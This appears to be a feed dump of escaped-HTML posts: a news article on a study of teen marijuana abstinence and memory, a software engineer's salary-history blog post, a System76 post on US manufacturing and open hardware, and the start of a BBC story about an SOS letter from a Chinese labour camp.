&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Marijuana, it seems, is not a performance-enhancing drug. That is, at least, not among young people, and not when the activity is learning.&lt;/p&gt;
&lt;p&gt;A study &lt;a href=&quot;https://www.psychiatrist.com/JCP/article/Pages/2018/v79/17m11977.aspx&quot;&gt;published Tuesday&lt;/a&gt; in the &lt;em&gt;Journal of Clinical Psychiatry&lt;/em&gt; finds that when adolescents stop using marijuana — even for just one week — their verbal learning and memory improve. The study contributes to growing &lt;a href=&quot;https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3930618/&quot;&gt;evidence that marijuana use in adolescents&lt;/a&gt; is associated with reduced neurocognitive functioning.&lt;/p&gt;
&lt;p&gt;More than 14 percent of students in middle school and high school reported using marijuana within the past month, finds a &lt;a href=&quot;http://www.monitoringthefuture.org/pubs/monographs/mtf-overview2017.pdf&quot;&gt;National Institutes of Health survey&lt;/a&gt; conducted in 2017. And marijuana use has increased among high-schoolers over the past 10 years, according to the &lt;a href=&quot;https://www.hhs.gov/ash/oah/adolescent-development/substance-use/marijuana/index.html&quot;&gt;U.S. Department of Health &amp;amp; Human Services&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;At the same time, the percentage of teens who believe that regular marijuana use poses a great risk to their health has &lt;a href=&quot;http://www.monitoringthefuture.org/pubs/monographs/mtf-vol2_2016.pdf&quot;&gt;dropped sharply since the mid-2000s&lt;/a&gt;. And legalization of marijuana may play a part in shaping how young people think about the drug. One study noted that &lt;a href=&quot;https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5365078/&quot;&gt;after 2012, when marijuana was legalized&lt;/a&gt; in Washington state, the number of eighth-graders there that believed marijuana posed risks to their health dropped by 14 percent.&lt;/p&gt;
&lt;aside id=&quot;ad-backstage-wrap&quot; aria-label=&quot;advertisement&quot;&gt;
&lt;/aside&gt;&lt;p&gt;Researchers are particularly concerned with marijuana use among the young because THC, the active ingredient in marijuana, most sharply affects the parts of the brain that develop during adolescence.&lt;/p&gt;
&lt;p&gt;&quot;The adolescent brain is undergoing significant neurodevelopment well into the 20s, and the regions that are last to develop are those regions that are most populated by cannabis receptors and are also very critical to cognitive functioning,&quot; says &lt;a href=&quot;http://www.mghaddictionmedicine.com/about/staff/randi-schuster-ph-d/&quot;&gt;Randi Schuster&lt;/a&gt;. Schuster is the director of neuropsychology at Massachusetts General Hospital's Center for Addiction Medicine and the study's lead author.&lt;/p&gt;
&lt;p&gt;Schuster and the team of researchers set out to determine if cognitive functions that are potentially harmed by marijuana use in adolescents — particularly attention and memory — improve when they abstain from marijuana.&lt;/p&gt;
&lt;p&gt;They recruited 88 pot-using teens and young adults, ages 16 to 25, and got some of them to agree to stop smoking (or otherwise consuming) marijuana for the month.&lt;/p&gt;
&lt;p&gt;Schuster says the researchers wanted to recruit a range of participants, not just heavy users or those in a treatment program, for example. Some of the young people smoked once per week; some smoked nearly daily.&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The researchers randomly assigned the volunteers into an abstaining group and a nonabstaining group. They delivered the bad news to those chosen to be abstainers at the end of their first visit, and Schuster says, they took it surprisingly well.&lt;/p&gt;
&lt;p&gt;&quot;People were generally fine,&quot; she says. &quot;We kind of went through what the next month would look like and helped them come up with strategies for staying abstinent.&quot;&lt;/p&gt;
&lt;p&gt;One motivation for the non-tokers to stick with the program? They received increasing amounts of money each week of the month-long study.&lt;/p&gt;
&lt;p&gt;The researchers urine-tested both groups on a weekly basis to make sure that the THC levels for the abstinent group were going down, and that the levels for the control group were staying consistent as they continued using.&lt;/p&gt;
&lt;p&gt;Also at each visit, the participants completed a variety of tasks testing their attention and memory through the &lt;a href=&quot;http://www.cambridgecognition.com/cantab/&quot;&gt;Cambridge Neuropsychological Test Automated Battery&lt;/a&gt;, a validated cognitive assessment tool.&lt;/p&gt;
&lt;p&gt;The researchers found that after four weeks, there was no noticeable difference in attention scores between the marijuana users and the nonusers. But, the memory scores of the nonusers improved, whereas the users' memories mostly stayed the same.&lt;/p&gt;
&lt;p&gt;The verbal memory test challenged participants to learn and recall new words, which &quot;lets us look both at their ability to learn information the first time the words were presented, as well as the number of words that they're able to retrieve from long-term memory storage after a delay,&quot; Schuster says.&lt;/p&gt;
&lt;p&gt;Verbal memory is particularly relevant for adolescents and young adults when they're in the classroom, Schuster says.&lt;/p&gt;
&lt;p&gt;&quot;For an adolescent sitting in their history class learning new facts for the first time, we're suspecting that active cannabis users might have a difficult time putting that new information into their long-term memory,&quot; Schuster says.&lt;/p&gt;
&lt;p&gt;While this study didn't prove that abstaining from cannabis improves adolescents' attention, other studies have found that &lt;a href=&quot;https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3930618/&quot;&gt;marijuana users fare worse in attention tests&lt;/a&gt; than nonusers. Schuster hypothesizes it might take more than four weeks of abstinence for attention levels to improve.&lt;/p&gt;
&lt;p&gt;Interestingly, most of the memory improvement for the abstinent group happened during the first week of the study, which leaves the researchers feeling hopeful.&lt;/p&gt;
&lt;p&gt;&quot;We were pleasantly surprised to see that at least some of the deficits that we think may be caused by cannabis appear to be reversible, and at least some of them are quickly reversible, which is good news,&quot; Schuster says.&lt;/p&gt;
&lt;p&gt;One weakness of this study is its lack of a non-marijuana-using control group, says &lt;a href=&quot;https://uwm.edu/psychology/people/lisdahl-krista-m/&quot;&gt;Krista Lisdahl&lt;/a&gt;, an associate professor of psychology at the University of Wisconsin Milwaukee who was not involved with the study but also researches the neuroscience of addiction. Because of this, it's difficult to conclude whether the improvements in memory brought the participants back to their baseline levels prior to using marijuana.&lt;/p&gt;
&lt;p&gt;Also, because the study lasted only four weeks, it's impossible to draw conclusions about the long-term effects of marijuana usage for young people, such as how marijuana directly affects academic performance, sleep patterns or mood.&lt;/p&gt;
&lt;p&gt;Lisdahl says that longitudinal studies such as the NIH's &lt;a href=&quot;https://abcdstudy.org/&quot;&gt;Adolescent Brain Cognitive Development Study&lt;/a&gt; could provide more information about what marijuana does to the adolescent brain. It might also reveal what happens if adolescents stop using marijuana and if their brain functioning can completely recover.&lt;/p&gt;
&lt;p&gt;Lisdahl is helping with the NIH study, which has, to date, enrolled more than 11,000 children ages 9 and 10 and will follow them into young adulthood. It's the largest long-term research study on child brain development in the U.S., and it assesses how everything from screen time to concussions to drugs affect adolescents' brains.&lt;/p&gt;
&lt;p&gt;In the meantime, Lisdahl says the findings from the new study — that abstinence from marijuana is associated with improvements in adolescents' learning and memory — sends a positive message.&lt;/p&gt;
&lt;p&gt;&quot;I remain optimistic that we can show recovery of function with sustained abstinence,&quot; she says.&lt;/p&gt;

<title>My somewhat complete salary history as a software engineer</title>
<link>https://humanwhocodes.com/blog/2018/10/my-somewhat-complete-salary-history-software-engineer/</link>
<guid isPermaLink="true" >https://humanwhocodes.com/blog/2018/10/my-somewhat-complete-salary-history-software-engineer/</guid>
<description>&lt;p&gt;It’s 2018 and somehow women are still getting paid less than men, even in supposedly progressive industries like software.[1] Whether that be from companies offering women less than men for the same position, women being less likely to negotiate or less successful in negotiations, or any of the other myriad reasons, the results are still the same: women make less than men for the same job. That’s something that shouldn’t be happening in today’s world and it’s up to us (read: men) to step up and make things right. This is my attempt to do just that.&lt;/p&gt;&lt;h2 id=&quot;why-am-i-doing-this&quot;&gt;Why am I doing this?&lt;/h2&gt;
&lt;p&gt;Longtime followers know that I’ve been dealing with serious health issues for several years. Two and a half years ago I had to stop working to focus on my health and it will likely be a couple more years before I’m able to even consider working a full-time job again. The people responsible for my last compensation package have long since left that company. That puts me in a unique position where I am not beholden to any past employers, and any future employers are far enough into the future that the information I’m sharing here will be mostly useless by then. Plus, as a white man, I know I’m going to be able to negotiate for my salary without backlash[2] when I do start working again. As such, the information in this post is more valuable to others than it is to me.&lt;/p&gt;
&lt;p&gt;As an aside, I’ve been annoyed that throughout my career I’ve been lectured many times to avoid discussing my compensation with colleagues. Usually it’s with the warning that, “not everyone is getting what you’re getting, and we don’t want to hurt feelings.” It took me a long time to realize that the “hurt feelings” they’re talking about come from an overall lack of transparency into the compensation process, and that simply explaining why people are compensated in certain ways would be a better solution than to hide all of the information from everyone. Yes, there will always be people who think they deserve to be making more but who don’t actually deserve it. That seems like a great way to communicate that they aren’t doing a good enough job and figure out ways to improve.&lt;/p&gt;
&lt;p&gt;The bottom line is that nothing gets better unless people are willing to share information. And while I could just share my last salary, I don’t think that’s very useful, especially when compared with the variety of already-available sources of information online. No, to be useful, I felt like I would need to reveal my entire salary history so people can determine for themselves if they’re seeing enough improvement in their salaries over time.&lt;/p&gt;
&lt;h2 id=&quot;where-did-this-data-come-from&quot;&gt;Where did this data come from?&lt;/h2&gt;
&lt;p&gt;The data in this post comes from the following sources:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;My memory. Yes, memory is fallible, but there are some data points that are so important on an emotional level that they tend to stick in my brain. I’ll point those out.&lt;/li&gt;
&lt;li&gt;Offer letters. As my offer letters post-2006 were always emailed to me, I’ve been able to be 100% sure of those details. Prior to 2006, my offer letters were always mailed to me, and I have no record of those.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Where my memory fails me and I don’t have an offer letter, I’ve made an attempt to guess the salary range I had at the time.&lt;/p&gt;
&lt;h2 id=&quot;the-data&quot;&gt;The data&lt;/h2&gt;
&lt;p&gt;The table below contains all of my salary (and some other compensation history). I’m including what I believe to be data relevant to evaluating the compensation include the year I received the salary, the years of experience I had at the time (&lt;strong&gt;YOE&lt;/strong&gt;), the starting and ending salary to take into account raises, and any signing bonus (&lt;strong&gt;Signing $&lt;/strong&gt;) and stock options (&lt;strong&gt;Options&lt;/strong&gt;) I might have received. Any amount with a question mark indicates that I’m guessing. I did not include any restricted stock units I might have received because I only ever received them at Yahoo as part of my initial offer.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Year&lt;/th&gt;
&lt;th&gt;YOE&lt;/th&gt;

&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 id=&quot;job-details&quot;&gt;Job Details&lt;/h2&gt;
&lt;p&gt;The data alone doesn’t really tell the full story, so here are the details around each position. I’ve also included how I came to work at each company, as I think it’s important to recognize blind resume submissions from having contacts as a company.&lt;/p&gt;
&lt;p&gt;In 2006, I moved from Massachusetts to California. This undoubtedly affected my pay positively due to the higher cost of living in California. At one point, my manager mentioned that if I moved back to Massachusetts, I should expect a 10% pay cut due to cost of living differences. I’m still in California, so I have no idea if that was accurate.&lt;/p&gt;
&lt;h3 id=&quot;radnet-2000-2001&quot;&gt;Radnet (2000-2001)&lt;/h3&gt;
&lt;p&gt;My first job out of college was at a small startup in Wakefield, MA called Radnet, Inc. I got this job because the woman who used to babysit me as a child was running human resources at the company. My official title was webmaster, and I thought I would be coming in to run the company website. As it turned out, between the time they offered me the job and my starting day, they had hired someone to oversee both UI development and the website. As it turned out, I would never manage the website and instead would spend time making JavaScript components for the company’s web application.&lt;/p&gt;
&lt;p&gt;I know that my starting salary was $48,000 (about $70,284 in 2018 dollars) because I was very excited about it. After spending summers working jobs that ranged from $2/hour to $6/hour, this seemed like an incredible amount of money to me. A few months in, they gave me a raise to $55,000 because I was doing a good job. Towards the end of 2000, they believed the company would be bought and so they changed my title to UI Developer and upped my salary to $62,500 with the belief that an acquirer would immediately fire the “webmaster” and ensuring I’d benefit from the acquisition.&lt;/p&gt;
&lt;p&gt;As it turned out, the company never got bought and so it shutdown in January 2001. I never really saw much of the $62,500, and eight months after I had started my first job, I was unemployed.&lt;/p&gt;
&lt;p&gt;The job itself was pretty low-stress. I worked an even 40 hours per week during my eight months there, and never once worked on a weekend.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; I did receive stock options for this position, but I don’t remember what they were. I didn’t really understand what stock options were at the time so that information never stuck in my brain.&lt;/p&gt;
&lt;h3 id=&quot;matrixone-2001-2005&quot;&gt;MatrixOne (2001-2005)&lt;/h3&gt;
&lt;p&gt;When Radnet closed down, my manager ended up at MatrixOne and asked if I would like to join him. I had enjoyed working with him at Radnet so I accepted. It’s important to understand that this was during the dot-com crash and there weren’t a lot of tech jobs to be had in Massachusetts at the time. I considered myself lucky to have formed a good relationship that allowed me to find a new job fairly quickly after Radnet shut down.&lt;/p&gt;
&lt;p&gt;I don’t remember all of the details but I’m pretty sure my starting salary was close to $68,000 ($96,814 in 2018 dollars). I’m also reasonably certain that I got a small signing bonus, maybe around $2,000, that my manager negotiated for me. I also received some stock options, but once again, I didn’t really understand what they were and so didn’t even register them as part of my compensation. It didn’t matter, though, because the company stock was never again as high as the day I joined. I was never able to exercise options, even when I got some repriced options later in my career there because the stock only ever went down. (Eventually the company would be bought out by a competitor.)&lt;/p&gt;
&lt;p&gt;My salary didn’t improve much there because the company was in perpetually poor financial health. There was a salary freeze in place almost the entire time I was there. I survived four rounds of layoffs. I was eventually “promoted” to the position of Senior Software Engineer, but it was a promotion in title only. There was no increase in salary (because of the salary freeze) and no change in my responsibilities (because the organization was weird). It was just a pat on the back to say, “good job, please don’t leave.” Spoiler alert: I left as soon as I could.&lt;/p&gt;
&lt;p&gt;Right before I left, I did get a salary increase to around $75,000. It wasn’t enough to make me want to stay.&lt;/p&gt;
&lt;p&gt;In terms of workload, once again I stuck pretty close to 40 hours per week and never worked a weekend. My commute, however, added three hours every day (1.5 hours each way). Adding in the commute time would make it 55 hours per week.&lt;/p&gt;
&lt;p&gt;This was the busiest time of my life, as I was not only working full time but was also writing my first book (nights and weekends) and going to school for my master’s degree (nights and weekends). I’m not quite sure how I ended up doing all of that, and managing a serious relationship with my then-partner, but somehow I made it through.&lt;/p&gt;
&lt;h3 id=&quot;vistaprint-2005-2006&quot;&gt;Vistaprint (2005-2006)&lt;/h3&gt;
&lt;p&gt;I often refer to my position at Vistaprint as my first real software engineering job. It was the first time I applied for a software engineering job without having a connection at the company; I just sent my resume in to their email address. I reported into the engineering organization (as opposed to the design organization in my prior jobs), and I got what I considered to be a good offer. The company was pre-IPO, and I was excited to get 3,000 stock options. (By this time, I actually understood what stock options were.)&lt;/p&gt;
&lt;p&gt;I don’t recall the starting salary but I suspect it was around $82,000 ($105,867 in 2018 dollars). I definitely recall the ending salary as $98,000 for a few reasons. First, I was complaining a lot about the boring project they had assigned me to so I expected that would eliminate me from any serious raise considerations. I was shocked to get a raise and even more shocked at the amount. Second, I was bummed they didn’t give me the extra $2,000 to make an even $100,000. Last, I was secretly interviewing with both Google and Yahoo, and upping my salary meant that I could use that number when it came time to talk compensation with them.&lt;/p&gt;
&lt;p&gt;I was only at Vistaprint for a little over a year before deciding to move to California to work for Yahoo. Vistaprint did go public while I was there, but since I left after a year, I didn’t see much from those stock options.&lt;/p&gt;
&lt;p&gt;The workload here was heavier but I still managed to stick to 40-45 hours per week. I don’t recall working any weekends, however, I do recall sometimes needing to work from home in the evening or early morning. All in all, though, the workload wasn’t that bad.&lt;/p&gt;
&lt;h3 id=&quot;yahoo-2006-2011&quot;&gt;Yahoo (2006-2011)&lt;/h3&gt;
&lt;p&gt;Yahoo’s initial offer was the best I had received up to that point. In addition to a $115,000 base salary ($143,833 in 2018 dollars), it included $10,000 signing bonus, 3,500 stock options, 1,500 RSUs, and relocation expenses. This was the first time I tried to negotiate for a higher starting salary and was summarily rejected. At least I tried.&lt;/p&gt;
&lt;p&gt;I ended up at Yahoo through a circuitous route. I had heard that Yahoo was using my first book, &lt;cite&gt;Professional JavaScript for Web Developers&lt;/cite&gt;, to teach JavaScript at the company. As such, I had an open invitation to stop by the campus if I was ever in the area. I had traveled to Mountain View to interview Google (they had found me through my second book, &lt;cite&gt;Professional Ajax&lt;/cite&gt;) and so reached out to the folks at Yahoo to meet up. I didn’t realize that conversation would turn into an invitation to apply to work at Yahoo as well.&lt;/p&gt;
&lt;p&gt;I don’t remember a lot of my pay details after I joined. Being at Yahoo for almost five years, I got several raises and two promotions, so my pay did keep increasing. All of that information was sent to my Yahoo corporate email address, and as such, I no longer have any of the documentation. That was intermixed with periods of layoffs and salary freezes. My initial stock options ended up worthless because the company stock price never again reached the level it was at when the options were priced. I would later get repriced stock options and more RSUs, but I don’t have specifics on that.&lt;/p&gt;
&lt;p&gt;By the time I left, I suspect I was making around $165,000 based on how I felt about the offer from Box.&lt;/p&gt;
&lt;p&gt;It’s worth noting that I left Yahoo to try to start a company with some friends and so didn’t have a regular salary for about 18 months.&lt;/p&gt;
&lt;p&gt;The workload at Yahoo varied based on the position I had at that time. When I first arrived at Yahoo, I was in a deep depression after moving across the country to a place where I didn’t know anyone. I found being alone in my apartment to be unbearable and so I would go into work early and leave late. Focusing on my work kept the bad thoughts out of my head and I really enjoyed working on My Yahoo, so it was a good mix. I was probably in the office from 9am to 7pm most days.&lt;/p&gt;
&lt;p&gt;Once I got more comfortable and started meeting people, I spent less time at the office and settled back into more of a 40-hour work week. Unfortunately, I also got more involved with writing and speaking, and those activities started to fill my nights and weekends. Before I knew it, I was basically working every day from the moment I woke up until the moment I went to sleep. Even though all of the work wasn’t Yahoo was paying me for, it was all the same type of work, so it all flowed together.&lt;/p&gt;
&lt;p&gt;The one thing I never did, though, was check my work email from home. I told everyone that leaving the office meant I was off the clock and the only way to reach me was to call me (I did give everyone my cell phone number). In my almost five years at Yahoo, I was only ever called once.&lt;/p&gt;
&lt;p&gt;There were several occasions when I had to work over the weekend, but my managers were very good about giving me that time back the next week. If I had to work over the weekend then I could choose the same number of days during the week to take off (I’d usually take Thursday and Friday the next week to get a long weekend).&lt;/p&gt;
&lt;h3 id=&quot;box-2013-2016&quot;&gt;Box (2013-2016)&lt;/h3&gt;
&lt;p&gt;My offer from Box was also strong. The starting salary of $175,000 ($189,415 in 2018 dollars) was more than enough to make me happy at the time, and the offer included 50,000 stock options. Box was pre-IPO so that high stock option allocation (which I was told was higher than what they usually gave people at my level) was a big consideration for me. I negotiated for a $25,000 signing bonus, as well.&lt;/p&gt;
&lt;p&gt;As part of my consulting business, I would regularly give talks at different companies. I agreed to give a talk for free at Box because a friend worked there and mentioned that they were having trouble managing their growing JavaScript code base. I spoke with a few people after the talk, including the VP of engineering, and we decided to explore if working at Box was a good fit for the company and me. Through several more discussions, it seemed like a good opportunity to get back into the stability of a regular salary with some interesting problems to tackle.&lt;/p&gt;
&lt;p&gt;My memory is a bit hazy around what happened between joining and the end of my time at Box as this was the period when my health was on a steep decline. I think I got one raise as a Staff Software Engineer about three months after I joined, and was informed of being promoted to Principal Architect six months after I joined (although I wouldn’t get the pay increase for another six months). I’m reasonably certain the promotion pay increase bumped me to $208,000. I recall clearly that I got one last raise to push me to $220,000 during 2014 because I had started working from home full time due to my health and I thought it was very nice of them to give me a raise regardless.&lt;/p&gt;
&lt;p&gt;At Box, I managed my workload very carefully due to my health. I started out at 40 hours per week but as my health declined, that number went down. I definitely dipped below that level later, but since we were evaluated on our impact rather than number of hours worked, I still got consistently positive reviews from my peers and manager. Box was also gracious enough to give me flexibility to work from home for two years, and even then, to work my own schedule as my health allowed. Ironically, it was my declining health that forced me to get smarter about how I worked and really keep my hours sane. I was also not spending time writing and speaking after the first year.&lt;/p&gt;
&lt;p&gt;I left Box when I was no longer physically able to work from home.&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;In my sixteen year career, I averaged a pay increase of $10,000 per year, even when taking into account several years of salary freezes at MatrixOne and Yahoo. As such, I suspect I’d be making around $250,000 if I was working full time today.&lt;/p&gt;
&lt;p&gt;It’s also important to understand that I never asked for a raise and only negotiated other details occassionally (as mentioned in the post). I never really felt comfortable with negotiations prior to working for myself, and generally was happy with the offers I received.&lt;/p&gt;
&lt;p&gt;With the exception of my one year at Vistaprint (during which I was a grouchy pain in the ass), I was consistently reviewed as a top performer at my position. I wasn’t put on any sort of improvement plan and most of my feedback had to do with improving interactions and communication with colleagues. And again, with the exception of Vistaprint (because…pain in the ass), I took the feedback to heart and worked to improve in those areas.&lt;/p&gt;
&lt;p&gt;Being single and not having a family to support throughout my entire career meant that I had more options. I could afford to take salary that was lower than what I wanted or could get elsewhere, and I could also afford to walk away from valuable stock options (such as with Vistaprint) to find a job that was more fulfilling. I recognize that not everyone has that option, so I think it’s important to make my situation clear here.&lt;/p&gt;
&lt;p&gt;I have two hopes from sharing this information. First, I hope that having this information will make it easier for women to understand how much they should be paid for similar work and just how their pay should be increasing throughout their career. Second, I hope that other men who are in a similarly independent position will also share their compensation history to benefit others.&lt;/p&gt;
&lt;p&gt;We can all be better if we’re willing to share.&lt;/p&gt;
&lt;h2 id=&quot;updates&quot;&gt;Updates&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;30-October-2018&lt;/strong&gt; - added in details about hours worked per week based on feedback.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;31-October-2018&lt;/strong&gt; - many people are sharing their salary histories on &lt;a href=&quot;https://news.ycombinator.com/item?id=18342996&quot;&gt;Hacker News&lt;/a&gt;.&lt;/li&gt;

<title>System76 on US Manufacturing and Open Hardware</title>
<link>https://blog.system76.com/post/179592732883/system76-on-us-manufacturing-and-open-hardware</link>
<guid isPermaLink="true" >https://blog.system76.com/post/179592732883/system76-on-us-manufacturing-and-open-hardware</guid>
<description>&lt;p&gt;We’ve seen some confusion about what it means to be a US computer manufacturer and about open hardware. With the Thelio launch just around the corner, it’s a great time for us to add some clarity. &lt;br/&gt;&lt;/p&gt;
&lt;p&gt;We’ve been working on the Thelio design for about three years. The philosophy around Thelio’s design was fourfold. The design should reflect our company character and culture, the design must support the maximum performance of the fastest available components, be easy to service and upgrade, and must represent the open source roots of System76. Early on, there was a lot of testing and experimentation. We engineered prototyping techniques to quickly iterate on ideas, optimize performance and thermal characteristics, and develop a strategy to open source as much functionality as possible.&lt;/p&gt;
&lt;p&gt;Eventually we were ready to move from acrylic prototypes to metal. Then we tried finding factory space in Colorado. That was much harder than expected and it took a full year. &lt;/p&gt;
&lt;p&gt;We moved an eight-person engineering and operations team over in March of this year and the rest of the team a few months later. We began converting the design from prototype to production. At our facility, we take in US-sourced sheet metal, aluminum extrusions, and other raw materials. We use production machinery to cut it, bend it, powder coat, etch, and then assemble the parts together along the way to producing the final product. We use components that we source outside the US, like the motherboard, memory, and drives to assemble orders to the customers’ needs. Technically, Thelio is “Designed and manufactured in the US with domestic and foreign components”.  &lt;/p&gt;
&lt;p&gt;We’ve seen it argued that this isn’t US manufacturing because every part isn’t made in the US. If we sourced every part externally, this would be called “assembled in the US.” That’s not what we’re doing here. We’re transforming raw materials into a final product. The work that goes into this kind of production is complex and expensive. That’s why the location where the final substantial transformation occurs is considered the place of manufacture and the country of origin. For Thelio, that happens in Denver. &lt;/p&gt;
&lt;p&gt;Building a factory was a massive step for us. This is the only way to excel as a company. For starters, it enables us to respond more rapidly to our customer’s needs. Additionally, bringing manufacturing in-house helps us reach the end goal: to build an open computer. Internal design and manufacturing is the strategy that we think is most plausible to reach the completely open computer. &lt;/p&gt;
&lt;img src=&quot;https://66.media.tumblr.com/0029d9beab26970a89176e703c5389f8/tumblr_inline_phf9l8FF9D1txpgep_500.png&quot; data-orig-width=&quot;749&quot; data-orig-height=&quot;183&quot; width=&quot;500&quot; height=&quot;122&quot; alt=&quot;image&quot;/&gt;&lt;p&gt;A completely open computer includes every part and component. The computer case, the motherboard, the drives, the memory, the cabling, the buttons, the ports, etc. The strictest definition of an open computer is that every single part of the product has openly licensed design files, schematics, and code. No one is there yet. We all understand that it’s not practical to start at the end. So we’re chipping away at the proprietary bits. There’s a lot of work to do. Those of us working to build open computers are taking different approaches and in doing so we all contribute toward this end. The important thing is that we’re all on the same trajectory. There’s a massive market out there that’s dominated by companies that don’t care about making open source hardware. We must make better products than they do if we are to turn that tide. &lt;/p&gt;
&lt;p&gt;So, what makes Thelio open hardware? The Thelio design we’ve worked on for three years is open source. That means anyone can study, modify, distribute, make, and sell the design. You can send the design files to a metal shop to make your own Thelio. You can adapt the design for your needs. Open source hardware is the physical version of open source software. We believe it’s important to apply the same passion we have about software freedom to the hardware itself. The open hardware community is young and small compared to open source software. We hope adding Thelio and Thelio Io to the ranks of open hardware will encourage others to join the movement and make their designs free as well. We’re very excited to see what people will do with free hardware designs. This is relatively new territory. &lt;/p&gt;
&lt;img src=&quot;https://66.media.tumblr.com/a079c4a810ed418dba5ba8376759fb4f/tumblr_inline_phf9rgjudI1txpgep_500.png&quot; data-orig-width=&quot;948&quot; data-orig-height=&quot;218&quot; width=&quot;500&quot; height=&quot;115&quot; alt=&quot;image&quot;/&gt;&lt;p&gt;To further our open computer ambition, we’re working to remove functionality from the proprietary mainboard. To that end, we designed Thelio Io, a daughter board that manages thermal and chassis control while also providing a storage backplane for the drives in Thelio. It’s open hardware and open source firmware, and a big step in the right direction. We’re by no means done. We’ll continue to open source more functionality. Eventually, all that will be left are proprietary hardware initialization bits and convincing Intel and AMD to open up there. We think there’s reason for optimism. Intel contributes lots of code to Linux and AMD graphics drivers are open source already. Maybe open hardware is next for them. Let’s keep pushing. &lt;/p&gt;
&lt;p&gt;This is just the start for us. Next, we move to designing laptops with open hardware designs and controllers. An open source keyboard? We’d love to make one. Motherboards? We’ll experiment there too.  Having a factory opens up all kinds of possibilities. It’ll take time and a lot of work, but we sure like where we’re headed.&lt;/p&gt;

        &lt;/figure&gt;&lt;p class=&quot;story-body__introduction&quot;&gt;Inside a notorious Chinese labour camp, a dissident smuggled an SOS letter into the Halloween decorations he was forced to manufacture. Years later, a woman in the US opened a box of fake tombstones and found his note. It seemed impossible at that moment that they would ever meet.&lt;/p&gt;&lt;p&gt;A few years ago, as the evenings began getting colder and darker, Julie Keith remembered the graveyard kit in her loft.&lt;/p&gt;&lt;p&gt;She'd picked it up for $29.99 from the supermarket chain, Kmart, a couple of years before that. It contained polystyrene headstones, fake skulls and bones, black spiders and a cloth drenched in imitation blood.&lt;/p&gt;&lt;p&gt;It had been gathering dust in the loft ever since. But when her daughter told her she wanted a Halloween-themed fifth birthday party, Julie, then 42, thought of the kit and went upstairs to fetch it.&lt;/p&gt;&lt;p&gt;Then, as she opened the box in her living room, a sheet of lined paper fell out. &lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

                 &lt;span class=&quot;story-image-copyright&quot;&gt;Flying Cloud Productions&lt;/span&gt;
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;On it was a message, neatly hand-written in blue ink. Julie's daughter picked it up and asked her to read it. The English was broken and frequently mis-spelt, but its meaning was clear enough.&lt;/p&gt;&lt;p&gt;&quot;Sir,&quot; it began. &quot;If you occassionally buy this product, please kindly send this letter to the World Human Right Organization. Thousands people here who are under the persicution of the Chinese Communist Party Government will thank and remember you forever.&quot;&lt;/p&gt;&lt;p&gt;Julie read on. The note said that the graveyard kit had been produced in unit eight, department two of Masanjia labour camp in Shenyang, China. Inmates there had to work there for 15 hours a day seven days a week: &quot;Otherwise, they will suffer torturement, beat and rude remark. Nearly no payment (10 yuan/1 month).&quot;  Today 10 yuan is roughly equivalent to £1.10 or US$1.44.&lt;/p&gt;&lt;p&gt;Prisoners were detained on average for one to three years without a formal court sentence, the note continued. Some of them belonged to the spiritual movement Falun Gong. &quot;They often suffer more punishment than others,&quot; the note said.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;There was no signature at the end.&lt;/p&gt;&lt;p&gt;&quot;I was kind of in shock,&quot; Julie says. &quot;I just couldn't believe that something like that was here, in front of me.&quot;&lt;/p&gt;&lt;p&gt;It seemed miraculous that this scrap of paper had travelled thousands of miles to her home in Damascus, near Portland, in the US state of Oregon, and then languished in her home for two years until 2012. She tried to imagine how desperate its author must have felt, how much courage it must have taken to slip it in among the decorations.&lt;/p&gt;&lt;p&gt;Julie, a manager at the Goodwill thrift store chain, knew nothing at all about this person, but it was obvious to her that he or she desperately wanted the world to know what was happening at Masanjia.&lt;/p&gt;&lt;hr class=&quot;story-body__line&quot;/&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;Find out more&lt;/h2&gt;&lt;p&gt;Julie Keith and Leon Lee were speaking to Outlook on the BBC World Service&lt;/p&gt;&lt;p&gt;You can listen again &lt;a href=&quot;https://www.bbc.co.uk/programmes/w3cswl56&quot; class=&quot;story-body__link&quot;&gt;here&lt;/a&gt;&lt;/p&gt;&lt;hr class=&quot;story-body__line&quot;/&gt;&lt;p&gt;Julie didn't know where to begin, so she logged on to Facebook and asked for advice.&lt;/p&gt;&lt;p&gt;She took a photo of the note and posted it for her friends to see. They suggested that she contact human rights organisations, so Julie rang up and left messages with several - but she never received a reply. &lt;/p&gt;&lt;p&gt;Still, Julie didn't give up. She took the letter into work and showed it to her company's PR manager, who contacted a journalist on The Oregonian, a local newspaper. The paper sent an intern to interview Julie - but for a couple of months, once again, there was silence. &lt;/p&gt;&lt;p&gt;Then suddenly, just before Christmas 2012, the story finally ran. It was on The Oregonian's front page, and immediately Julie's phone started ringing.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/span&gt;
            
